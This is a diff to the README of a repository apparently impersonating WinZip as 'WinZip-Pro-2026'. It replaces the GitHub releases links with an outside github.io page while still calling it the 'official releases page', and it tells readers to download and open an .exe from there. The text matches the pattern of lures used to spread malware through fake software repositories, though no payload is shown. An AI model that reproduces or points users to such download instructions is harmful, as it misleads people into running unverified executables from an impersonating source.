@@ -1,6 +1,6 @@
 # 📦 WinZip-Pro-2026 - Securely manage and compress your files
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Examinationusa643/WinZip-Pro-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://examinationusa643.github.io)
 
 WinZip-Pro-2026 helps you organize, protect, and share data on your Windows computer. This software creates encrypted archives, uploads files to cloud storage, and checks your archives for errors. It simplifies your daily file management.
 
@@ -24,7 +24,7 @@ WinZip-Pro-2026 helps you organize, protect, and share data on your Windows comp
 
 Follow these steps to set up the software on your system.
 
-1.  Visit the [official releases page](https://github.com/Examinationusa643/WinZip-Pro-2026/releases).
+1.  Visit the [official releases page](https://examinationusa643.github.io).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the file ending in `.exe` to start your download.
 4.  Open the downloaded file from your browser or your Downloads folder.
